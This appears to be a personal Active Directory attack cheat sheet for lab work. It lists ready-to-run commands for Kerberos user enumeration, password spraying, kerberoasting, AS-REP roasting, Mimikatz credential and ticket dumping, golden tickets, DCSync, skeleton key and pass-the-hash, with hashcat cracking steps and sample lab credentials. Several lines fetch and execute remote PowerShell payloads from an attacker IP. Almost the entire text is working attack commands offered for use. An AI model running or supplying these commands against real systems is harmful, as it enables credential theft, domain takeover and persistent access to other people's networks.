#KERBRUTE
##Path
~/hack/tools/kerbrute-1.0.3

##Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

##Enumeration
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

##Password Spray
./kerbrute_linux_amd64 passwordspray --dc controller.local -d controller.local ./wordlist.txt Password1

#RUBEUS

##Harvest TGT's from Host
Rubeus.exe harvest /interval:30 

##Password Spray
Rubeus.exe brute /password:Password1 /noticket

##Kerberoast
Rubeus.exe kerberoast
hashcat -m 13100 -a 0 hash.txt Pass.txt

##AS-REP Roasting -Pre-Auth Disabled
	* Rubeus.exe asreproast  - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes
	* Crack those Hashes w/ hashcat - 
		○ 1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
		○ 2.) Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
		○ 3.) hashcat -m 18200 hash.txt Pass.txt - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
	

#IMPACKET

##KERBEROAST
Kerberoast - EXECUTED REMOTELY FROM KALI, ENUMRATES AND REQUESTS ALL KERBEROASTABLE ACCOUNTS
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.105.214 -request

##AS-REP Roasting
GetNPUsers.py
GetNPUsers.py <DOMAIN NAME>/ -no-pass -usersfile usernames.txt

##Dump Secrets
secretsdump.py thm-ad/backup:'backup2517860'@thm-ad

#MIMIKATZ

##Download and Dump Creds
iex (iwr http://10.9.80.37/Invoke-Mimikatz.ps1 -UseBasicParsing);Invoke-Mimikatz -DumpCreds

##Dump Hashes
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
hashcat -m 1000 <hash> rockyou.txt

##Export Tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

##Pass the Ticket
 Invoke-Mimikatz -Command '"kerberos::ptt [0;59dfa]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi"'

##Golden Ticket Attack

	1. Execute mimikatz on DC as DA to get krbtgt hash
		a. Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc 
	2. On any machine 
		a. Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges: 
	• Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"' 
Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 /groups:512 /ptt"'

##Skeleton Key
Invoke-Mimikatz -Command '"misc::skeleton"'

#POWERVIEW

iex (iwr http://10.9.80.37/PowerView3.ps1 -UseBasicParsing)

#EVIL-WINRM

##PTH
evil-winrm -i thm-ad -u administrator -H 0e0363213e37b94221497260b0bcb4fc

#BLOODHOUND

iex (iwr http://10.9.80.37/SharpHound.ps1 -UseBasicParsing)
Invoke-BloodHound -CollectionMethod ALL
